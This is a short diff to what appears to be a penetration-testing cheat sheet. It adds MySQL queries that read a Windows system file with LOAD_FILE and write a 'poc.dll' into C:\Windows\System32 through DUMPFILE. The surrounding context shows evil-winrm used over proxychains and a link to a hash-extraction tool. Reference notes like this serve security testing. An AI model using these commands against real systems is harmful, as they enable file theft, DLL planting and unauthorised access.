@@ -740,6 +740,16 @@ cat /etc/proxychains4.conf
 proxychains evil-winrm -i '<host>' -u '<username>'
 ```
 
+additional use
+
+port forwarding to access MySQL
+
+```mysql
+/* MySQL */
+SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts') AS Result;
+SELECT LOAD_FILE('C:\\Users\\Public\\Documents\\poc.dll') INTO DUMPFILE "C:\\Windows\\System32\\poc.dll";
+```
+
 ### :open_file_folder: MSSQL
 
 [Extract hash from MDF](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)
